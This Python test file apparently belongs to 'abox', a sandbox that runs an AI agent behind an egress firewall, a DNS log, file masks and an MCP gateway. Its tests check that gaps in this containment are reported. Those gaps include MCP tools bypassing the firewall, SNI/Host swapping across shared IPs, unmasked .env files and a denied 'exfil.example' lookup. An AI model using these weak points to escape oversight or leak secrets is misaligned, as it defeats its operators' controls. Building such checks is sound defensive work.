    assert "curl" in checks["servers.poci"].detail
    assert "nothing to pin" in checks["servers.poci"].detail


def test_pin_false_does_not_fail_the_pinning_check(manifest, config, runner_fake) -> None:
    """A `pin: false` local image is deliberately unpinned. It must surface as
    the custom-unpinned warning, never as a hard failure of the digest-pinned
    check — that check would order the operator to pin the very thing they chose
    not to. (Regression: a live `abox doctor` showed both at once.)"""
    from abox.catalog import Catalog, custom_to_catalog

    custom = CustomServers(
        servers={"serena": CustomServer(image="serena:local", pin=False)}
    )
    cat = Catalog(servers=custom_to_catalog(custom))
    manifest.servers = ["serena"]
    checks = {c.id: c for c in doctor.check_servers(manifest, cat, custom, config)}
    assert checks["servers.pinned"].status is doctor.Status.ok
    assert checks["servers.custom-unpinned"].status is doctor.Status.warn


def test_custom_server_pin_false_is_flagged_not_blocked(manifest) -> None:
    """`pin: false` runs a local image on trust. Doctor surfaces that as its own
    warning — no digest, no signature check — rather than accepting it in
    silence or pretending it will fail."""
    manifest.servers = ["serena"]
    custom = CustomServers(
        servers={"serena": CustomServer(image="serena:local", pin=False)}
    )
    checks = {c.id: c for c in doctor.check_custom_servers(manifest, custom)}
    assert "servers.custom-unpinned" in checks
    assert checks["servers.custom-unpinned"].status is doctor.Status.warn
    assert "serena:local" in checks["servers.custom-unpinned"].detail


def test_pinned_custom_server_check_does_not_claim_signature_failure(manifest) -> None:
    """Custom images outside docker.io/mcp/* are never signature-verified by the
    gateway, so the check must not warn that an unsigned one "fails to start" —
    it won't."""
    digest = "ghcr.io/me/serena@sha256:" + "b" * 64
    manifest.servers = ["serena"]
    custom = CustomServers(servers={"serena": CustomServer(image=digest)})
    checks = {c.id: c for c in doctor.check_custom_servers(manifest, custom)}
    assert "servers.custom" in checks
    assert "fails to start" not in checks["servers.custom"].hint
    assert "docker.io/mcp/*" in checks["servers.custom"].hint


def test_boundary_spanning_servers_are_named(manifest) -> None:
    """MCP tools run in the gateway's containers, so the agent's firewall and
    masks do not constrain them. That is inherent, and worth saying out loud."""
    manifest.servers = ["curl", "filesystem", "duckduckgo"]
    checks = {c.id: c for c in doctor.check_boundary_spanning_servers(manifest)}
    check = checks["servers.boundary-spanning"]
    assert check.status is doctor.Status.warn
    assert "curl" in check.detail and "filesystem" in check.detail
    assert "duckduckgo" not in check.detail
    assert "egress allowlist" in check.detail


def test_no_boundary_warning_for_ordinary_servers(manifest) -> None:
    manifest.servers = ["duckduckgo"]
    assert doctor.check_boundary_spanning_servers(manifest) == []


def test_settings_flag_is_passed_only_when_there_are_settings(manifest: Manifest) -> None:
    assert "--settings" not in runner.claude_argv(manifest, "x")
    argv = runner.claude_argv(manifest, "x", settings="/opt/abox/settings.json")
    assert argv[argv.index("--settings") + 1] == "/opt/abox/settings.json"


def test_tool_schema_cost_is_proportional() -> None:
    from abox import gateway as gw

    small = [{"name": "a", "description": "x"}]
    big = [{"name": "a", "description": "x" * 4000}]
    assert gw.tool_schema_cost(small) < gw.tool_schema_cost(big)
    assert gw.tool_schema_cost(big) > 900  # ~4 chars/token


def test_shared_addresses_are_reported(manifest, config) -> None:
    """The firewall matches IPs, so domains sharing one are not separable —
    saying otherwise would overstate what the sandbox does."""
    import socket

    real = socket.getaddrinfo

    def fake(host, *a, **k):
        return [(socket.AF_INET, socket.SOCK_STREAM, 6, "", ("203.0.113.7", 0))]

    socket.getaddrinfo = fake
    try:
        check = doctor.check_shared_addresses(manifest, config)
    finally:
        socket.getaddrinfo = real
    assert check.status is doctor.Status.warn
    assert "203.0.113.7" in check.detail
    assert "SNI/Host swapping" in check.hint


def test_logs_are_harvested_as_root(manifest, rendered, runner_fake) -> None:
    """The log dir is not bind-mounted, so the only way out is the socket abox
    already holds — which is also why the agent cannot edit it."""
    provisioned = runner.Provisioned(
        run_id="r1", container_id="c1", container_name="agent-demo-r1",
        workspace=rendered, config_path=render.runspec_path(rendered),
    )
    runner_fake.expect(r"cat /var/log/abox/dns.log", "query[A] x.example from 1.2.3.4\n")
    collected = runner.harvest_logs(provisioned)
    assert "dns.log" in collected
    call = runner_fake.find("dns.log")[0]
    assert call.argv[:4] == ("docker", "exec", "-u", "root")
    assert (paths.current_run_dir(rendered) / "dns.log").is_file()


# -- agent images accumulate -----------------------------------------------


IMAGE_LS = (
    "abox-agent-demo:aaaaaaaaaaaa\tsha256:aaa\t1.4GB\n"
    "abox-agent-demo:bbbbbbbbbbbb\tsha256:bbb\t1.35GB\n"
    "abox-agent-demo:<none>\tsha256:ccc\t1.3GB\n"
)


def test_agent_images_are_parsed_with_their_sizes(runner_fake) -> None:
    runner_fake.expect(r"image ls abox-agent-demo", IMAGE_LS)
    images = dockerx.agent_images("demo")
    assert [i.tag for i in images] == [
        "abox-agent-demo:aaaaaaaaaaaa",
        "abox-agent-demo:bbbbbbbbbbbb",
    ]
    assert images[0].size == 1_400_000_000


def test_a_dangling_tag_is_not_reported_as_an_image(runner_fake) -> None:
    """`<none>` is what an image looks like once a newer build stole its tag;
    naming it would promise a removal that does nothing for the operator."""
    runner_fake.expect(r"image ls abox-agent-demo", IMAGE_LS)
    assert all("<none>" not in i.tag for i in dockerx.agent_images("demo"))


@pytest.mark.parametrize(
    ("text", "expected"),
    [("1.4GB", 1_400_000_000), ("523MB", 523_000_000), ("12KB", 12_000), ("0B", 0), ("?", 0)],
)
def test_docker_sizes_are_parsed(text: str, expected: int) -> None:
    """`docker image ls` has no numeric size verb, so the human string is it."""
    assert dockerx._parse_size(text) == expected


def test_doctor_warns_about_superseded_images(
    manifest: Manifest, rendered: Path, runner_fake
) -> None:
    """A superseded image this workspace is recorded as having built."""
    from abox import cli as cli_mod

    stale = IMAGE_LS.splitlines()[0].split("\t")[0]
    cli_mod._record_built_images(rendered, [stale])
    runner_fake.expect(r"image ls abox-agent-demo", IMAGE_LS)
    check = doctor.check_agent_images(manifest, rendered)
    assert check.status is doctor.Status.warn
    assert "reclaimable" in check.detail
    assert check.data["count"] == 2


def test_doctor_does_not_promise_to_reclaim_what_it_cannot_attribute(
    manifest: Manifest, rendered: Path, runner_fake
) -> None:
    """An image built before the ledger existed belongs to no workspace abox can
    identify, so no abox command will ever remove it. Calling it "reclaimable"
    and naming `abox up` sends the operator to run something that does nothing,
    on every single run — which is how a real warning becomes noise."""
    runner_fake.expect(r"image ls abox-agent-demo", IMAGE_LS)
    check = doctor.check_agent_images(manifest, rendered)
    assert check.status is doctor.Status.warn
    assert "cannot be attributed" in check.detail
    assert "reclaimable" not in check.detail
    assert "remove by hand" in check.hint


def test_doctor_is_quiet_when_only_the_current_image_exists(
    manifest: Manifest, rendered: Path, runner_fake
) -> None:
    current = render.inspect_rendered(rendered)["image"]
    runner_fake.expect(r"image ls abox-agent-demo", f"{current}\tsha256:aaa\t1.4GB\n")
    check = doctor.check_agent_images(manifest, rendered)
    assert check.status is doctor.Status.ok
    assert "superseded" not in check.detail


def test_doctor_skips_when_nothing_has_been_built(
    manifest: Manifest, rendered: Path, runner_fake
) -> None:
    runner_fake.expect(r"image ls abox-agent-demo", "")
    assert doctor.check_agent_images(manifest, rendered).status is doctor.Status.skip


# -- tool narrowing -------------------------------------------------------


def _narrowing_manifest() -> Manifest:
    return Manifest(
        project="a",
        profile="dev",
        servers=["duckduckgo"],
        tools={"duckduckgo": ["search"]},
    )


def test_tool_narrowing_fails_when_the_gateway_serves_every_tool(config) -> None:
    """The reported bug, end to end: a co-tenant project that does not narrow
    makes the union win, `--tools=` disappears from the gateway argv, and this
    project's declared filter binds nowhere. It used to say nothing at all."""
    reg = gateway.ProfileRegistry(profile="dev")
    reg.register(
        project_hash="a",
        workspace="/a",
        project="a",
        servers=["duckduckgo"],
        tools={"duckduckgo": ["search"]},
    )
    reg.register(
        project_hash="b", workspace="/b", project="b", servers=["duckduckgo"], tools={}
    )
    reg.save()

    running = {"Args": ["--transport=streaming", "--servers=duckduckgo", "--verify-signatures"]}
    check = doctor.check_tool_narrowing(_narrowing_manifest(), config, running)

    assert check.status is doctor.Status.fail
    assert "duckduckgo" in check.detail
    assert "b" in check.hint, "the co-tenant that caused the drop is not named"


def test_tool_narrowing_passes_when_the_running_gateway_carries_the_filter(config) -> None:
    """The positive path through the same argv read — a fail-only test cannot
    tell an enforced filter from a check that never looked."""
    reg = gateway.ProfileRegistry(profile="dev")
    reg.register(
        project_hash="a",
        workspace="/a",
        project="a",
        servers=["duckduckgo"],
        tools={"duckduckgo": ["search"]},
    )
    reg.save()

    running = {"Args": ["--servers=duckduckgo", "--tools=search"]}
    check = doctor.check_tool_narrowing(_narrowing_manifest(), config, running)
    assert check.status is doctor.Status.ok


def test_tool_narrowing_warns_when_the_gateway_predates_the_manifest(config) -> None:
    running = {"Args": ["--servers=duckduckgo", "--tools=something_else"]}
    check = doctor.check_tool_narrowing(_narrowing_manifest(), config, running)
    assert check.status is doctor.Status.warn
    assert "search" in check.detail


def test_tool_narrowing_skips_without_asserting_anything_it_did_not_check(config) -> None:
    """A stopped gateway must not read as "enforced". The check that cannot see
    the argv says so, rather than reporting the clean-looking answer."""
    check = doctor.check_tool_narrowing(_narrowing_manifest(), config, None)
    assert check.status is doctor.Status.skip
    assert "not running" in check.detail

    plain = Manifest(project="a", profile="dev", servers=["duckduckgo"])
    assert doctor.check_tool_narrowing(plain, config, {"Args": []}).status is doctor.Status.skip


def test_tool_narrowing_reaches_the_doctor_report(config, catalog_file, runner_fake) -> None:
    """The unit tests above call check_tool_narrowing directly, so all four pass
    just as happily when nothing ever runs it. A check that does not reach the
    report is the same as no check — so assert against the report the operator
    actually sees, not against the function."""
    from abox import catalog as catalog_mod

    cat = catalog_mod.load(allow_oci_fallback=False)
    ids = {
        c.id
        for c in doctor.check_servers(_narrowing_manifest(), cat, CustomServers(), config)
    }
    assert "gateway.tool-narrowing" in ids, "the check never reaches the report"


# -- the egress review queue must be evidence, not silence -----------------


def _record_run(workspace: Path, run_id: str) -> None:
    from abox import telemetry

    telemetry.record_run(
        workspace,
        telemetry.RunRecord(
            id=run_id,
            ts="2026-08-02T00:00:00Z",
            project="demo",
            profile="dev",
            prompt_sha="x",
            duration_s=1.0,
            exit_code=0,
        ),
    )


def test_egress_queue_fails_when_a_run_recorded_no_dns_at_all(
    manifest, config, workspace: Path
) -> None:
    """An empty queue looks identical whether nothing was denied or nothing was
    watching. The second is a real state — dnsmasq absent, Docker's embedded
    resolver still in /etc/resolv.conf, every name resolving and nothing logged
    — and it used to read as `ok — nothing undecided`."""
    _record_run(workspace, "r1")

    check, denied = doctor.check_egress_queue(manifest, config, workspace)

    assert check.status is doctor.Status.fail
    assert "r1" in check.detail
    assert denied == []


def test_egress_queue_is_quiet_once_the_dns_stream_carries_that_run(
    manifest, config, workspace: Path, tmp_path: Path
) -> None:
    """The positive path through the same control: a fail-only test cannot tell
    "the stream was checked" from "the check never ran"."""
    from abox import telemetry

    _record_run(workspace, "r1")
    log = tmp_path / "dns.log"
    log.write_text("query[A] github.com from 172.18.0.3\n")
    telemetry.collect_dns(workspace, "r1", log=log)

    check, _ = doctor.check_egress_queue(manifest, config, workspace)
    assert check.status is doctor.Status.ok
    assert "nothing undecided" in check.detail


def test_egress_queue_still_warns_on_a_denied_name(
    manifest, config, workspace: Path, tmp_path: Path
) -> None:
    from abox import telemetry

    _record_run(workspace, "r1")
    log = tmp_path / "dns.log"
    log.write_text("query[A] exfil.example from 172.18.0.3\n")
    telemetry.collect_dns(workspace, "r1", log=log)

    check, denied = doctor.check_egress_queue(manifest, config, workspace)
    assert check.status is doctor.Status.warn
    assert [d.name for d in denied] == ["exfil.example"]


def test_egress_queue_says_nothing_before_the_first_run(
    manifest, config, workspace: Path
) -> None:
    """No run recorded is not a blind observation channel — it is no observation
    to make, and failing there would be a red the operator cannot clear."""
    check, _ = doctor.check_egress_queue(manifest, config, workspace)
    assert check.status is doctor.Status.ok


# -- mask overlays are only real in the argv -------------------------------


def _drop_mask_mounts(spec) -> None:
    """Remove every overlay under /workspace/, leaving masked_paths untouched."""
    args = [str(a) for a in spec["run_args"]]
    kept: list[str] = []
    index = 0
    while index < len(args):
        if (
            args[index] == "--mount"
            and index + 1 < len(args)
            and "target=/workspace/" in args[index + 1]
        ):
            index += 2
            continue
        kept.append(args[index])
        index += 1
    spec["run_args"] = kept


def test_mask_overlays_pass_on_a_clean_render(manifest, config, rendered) -> None:
    check = doctor.check_mask_overlays(manifest, config, rendered)
    assert check.status is doctor.Status.ok
    assert ".env" in check.detail


def test_mask_overlays_go_red_when_the_render_drops_the_mounts(
    manifest, config, workspace, monkeypatch
) -> None:
    """The only thing that masks `.env` is an empty read-only bind in run_args.

    A regression in `mask_mounts` is not tampering — `abox up` re-renders,
    re-hashes and rebuilds — so every artifact check stayed green while the
    agent bind-mounted the real /workspace/.env. The runspec is re-rendered here
    rather than hand-edited for exactly that reason: the hashes must still match
    or the test proves only that artifacts.integrity works.
    """
    monkeypatch.setattr(render, "mask_mounts", lambda _workspace, _entries: [])
    spec = gateway.build_spec("dev", config, servers=manifest.servers)
    render.write(render.render(manifest, config, workspace, spec))

    checks = {c.id: c for c in doctor.check_artifacts(manifest, config, workspace)}
    assert checks["artifacts.integrity"].status is doctor.Status.ok, "not a tampering test"
    assert checks["artifacts.current"].status is doctor.Status.ok
    assert checks["artifacts.masks-mounted"].status is doctor.Status.fail
    assert ".env" in checks["artifacts.masks-mounted"].detail
    assert (workspace / ".env").read_text() == "TOKEN=hunter2\n", "the fixture secret moved"


def test_mask_overlays_go_red_when_the_render_recorded_nothing(
    manifest, config, rendered
) -> None:
    """Reached from the other side: a render that drops every entry records no
    masked_paths either, so there is nothing to reconcile — ask the workspace."""
    _mutate_runspec(rendered, _drop_mask_mounts)
    state_path = render.artifacts_path(rendered) / "artifacts.json"
    state = json.loads(state_path.read_text())
    state["masked_paths"] = []
    state_path.chmod(0o600)
    state_path.write_text(json.dumps(state))

    check = doctor.check_mask_overlays(manifest, config, rendered)
    assert check.status is doctor.Status.fail
    assert "recorded no mask at all" in check.detail


def test_mask_check_reaches_the_doctor_report(manifest, config, rendered, runner_fake) -> None:
    """Calling the check directly proves nothing about whether anything calls it."""
    assert "artifacts.masks-mounted" in {
        c.id for c in doctor.check_artifacts(manifest, config, rendered)
    }
    report = doctor.preflight(manifest, config, rendered)
    assert "artifacts.masks-mounted" in {c.id for c in report.checks}


# -- the gateway's image must be attributable ------------------------------


def test_gateway_digest_fails_on_an_image_with_no_repo_digest(config, runner) -> None:
    """`docker build -t docker/mcp-gateway:<tag> .` and start it by hand: the
    container is up and holding the Docker socket, and its image carries an
    empty RepoDigests. That single None used to mean "not running", so the one
    check written to catch a swapped gateway went grey against exactly it — and
    said something false about the machine while doing so."""
    image_id = "sha256:" + "a" * 64
    runner.expect(r"docker container inspect", json.dumps({"State": {"Running": True},
                                                           "Image": image_id}))
    runner.expect(r"docker image inspect", json.dumps({"RepoDigests": []}))

    check = doctor.check_gateway_image_drift("dev", config)

    assert check.status is doctor.Status.fail
    assert image_id in check.detail


def test_container_image_keeps_the_three_states_apart(runner) -> None:
    runner.expect(r"docker container inspect", "", returncode=1)
    absent = dockerx.container_image("abox-gw-dev")
    assert not absent.exists and not absent.digest

    runner.responses.clear()
    runner.expect(r"docker container inspect", json.dumps({"Image": "sha256:aa"}))
    runner.expect(r"docker image inspect", json.dumps({"RepoDigests": []}))
    local = dockerx.container_image("abox-gw-dev")
    assert local.exists and local.image_id == "sha256:aa" and not local.digest


# -- the MCP endpoint the argv actually names ------------------------------


def _hygiene(workspace: Path, manifest: Manifest, check_id: str):
    return {c.id: c for c in doctor.check_agent_hygiene(workspace, manifest)}[check_id]


def test_single_mcp_endpoint_reads_the_runspec_not_a_constant(manifest, rendered) -> None:
    check = _hygiene(rendered, manifest, "agent.single-mcp-endpoint")
    assert check.status is doctor.Status.ok
    assert check.data["mcp_config"] == render.MCP_CONFIG_PATH


def test_single_mcp_endpoint_goes_red_when_the_argv_leaves_the_staged_volume(
    manifest, rendered
) -> None:
    """The exact divergence that shipped: the argv said /opt/abox/mcp.json — the
    world-readable bind — while the volume carrying the gateway bearer token is
    mounted at /run/abox. The check restated a constant and reported ok."""
    _mutate_runspec(rendered, lambda spec: spec.update(mcp_config="/opt/abox/mcp.json"))

    check = _hygiene(rendered, manifest, "agent.single-mcp-endpoint")
    assert check.status is doctor.Status.fail
    assert "/opt/abox/mcp.json" in check.detail


def test_single_mcp_endpoint_goes_red_when_the_volume_is_not_mounted(
    manifest, rendered
) -> None:
    def drop_volume(spec) -> None:
        args = [str(a) for a in spec["run_args"]]
        kept: list[str] = []
        index = 0
        while index < len(args):
            if args[index] == "--mount" and "target=/run/abox" in args[index + 1]:
                index += 2
                continue
            kept.append(args[index])
            index += 1
        spec["run_args"] = kept

    _mutate_runspec(rendered, drop_volume)
    assert _hygiene(rendered, manifest, "agent.single-mcp-endpoint").status is doctor.Status.fail


# -- the SNI proxy enforces a config, not a heartbeat ----------------------


@pytest.fixture
def proxied(config: GlobalConfig) -> GlobalConfig:
    config.egress_proxy.enabled = True
    return config


@pytest.fixture
def proxy_rendered(manifest: Manifest, proxied: GlobalConfig, workspace: Path) -> Path:
    spec = gateway.build_spec("dev", proxied, servers=manifest.servers)
    render.write(render.render(manifest, proxied, workspace, spec))
    return workspace


def _proxy_checks(manifest, proxied, workspace, runner_fake, *, running: bool = True):
    if running:
        runner_fake.expect(r"docker container inspect", json.dumps({"State": {"Running": True}}))
    return {c.id: c for c in doctor.check_egress_proxy(manifest, proxied, workspace)}


def test_proxy_drift_passes_when_the_container_matches_the_rendered_config(
    manifest, proxied, proxy_rendered, runner_fake
) -> None:
    from abox import proxy as proxy_mod

    fingerprint = proxy_mod.build_spec(manifest, proxied, proxy_rendered).fingerprint()
    proxy_mod._fingerprint_path(manifest.project).write_text(fingerprint, encoding="utf-8")

    checks = _proxy_checks(manifest, proxied, proxy_rendered, runner_fake)
    assert checks["egress.proxy-drift"].status is doctor.Status.ok


def test_proxy_drift_fails_when_the_running_proxy_predates_the_render(
    manifest, proxied, proxy_rendered, runner_fake
) -> None:
    """nginx reads its config once, at start, and proxy.conf is a bind abox
    rewrites in place. A container that outlived a re-render is still enforcing
    the previous, wider map — and `egress.proxy` calls that running."""
    from abox import proxy as proxy_mod

    proxy_mod._fingerprint_path(manifest.project).write_text("older", encoding="utf-8")

    checks = _proxy_checks(manifest, proxied, proxy_rendered, runner_fake)
    assert checks["egress.proxy-drift"].status is doctor.Status.fail
    assert "reads proxy.conf once" in checks["egress.proxy-drift"].detail


def test_proxy_drift_fails_when_no_fingerprint_was_recorded(
    manifest, proxied, proxy_rendered, runner_fake
) -> None:
    """A missing file is not a match: it means what the container was started
    with cannot be established at all."""
    checks = _proxy_checks(manifest, proxied, proxy_rendered, runner_fake)
    assert checks["egress.proxy-drift"].status is doctor.Status.fail
    assert "no fingerprint" in checks["egress.proxy-drift"].detail


def _drop_from_the_sni_map(workspace: Path, domain: str) -> None:
    conf = render.artifacts_path(workspace) / render.ARTIFACT_PROXY
    conf.chmod(0o600)
    conf.write_text(
        "\n".join(
            line for line in conf.read_text().splitlines() if f'"{domain}"' not in line
        )
        + "\n"
    )


def test_mandatory_egress_reads_the_sni_map_in_proxy_mode(
    manifest, proxied, proxy_rendered
) -> None:
    check = doctor.check_mandatory_egress(manifest, proxied, proxy_rendered)
    assert check.status is doctor.Status.ok
    assert "SNI map" in check.detail


def test_mandatory_egress_fails_when_the_sni_map_drops_a_claude_endpoint(
    manifest, proxied, proxy_rendered
) -> None:
    """In proxy mode ALLOW_DOMAINS is rendered and never consumed — the template
    skips the resolve/ipset loop entirely — so grepping the firewall script
    proved a property of an inert string list while nginx's map decided."""
    _drop_from_the_sni_map(proxy_rendered, "platform.claude.com")

    check = doctor.check_mandatory_egress(manifest, proxied, proxy_rendered)
    assert check.status is doctor.Status.fail
    assert check.data["missing"] == ["platform.claude.com"]


def test_proxy_allowlist_fails_when_the_map_loses_a_domain(
    manifest, proxied, proxy_rendered, runner_fake
) -> None:
    _drop_from_the_sni_map(proxy_rendered, "github.com")

    checks = _proxy_checks(manifest, proxied, proxy_rendered, runner_fake)
    check = checks["egress.proxy-allowlist"]
    assert check.status is doctor.Status.fail
    assert check.data["missing"] == ["github.com"]


def test_proxy_allowlist_passes_on_the_rendered_map(
    manifest, proxied, proxy_rendered, runner_fake
) -> None:
    checks = _proxy_checks(manifest, proxied, proxy_rendered, runner_fake)
    assert checks["egress.proxy-allowlist"].status is doctor.Status.ok


def test_the_proxy_checks_reach_the_run_gate(
    manifest, proxied, proxy_rendered, runner_fake
) -> None:
    """`abox run` gates on preflight, which did not look at the proxy at all —
    so the enforcement point with the widest blast radius was checked only by
    `abox doctor`, and only for liveness."""
    runner_fake.expect(r"docker container inspect", json.dumps({"State": {"Running": True}}))
    ids = {c.id for c in doctor.preflight(manifest, proxied, proxy_rendered).checks}
    assert {"egress.proxy", "egress.proxy-drift", "egress.proxy-allowlist"} <= ids
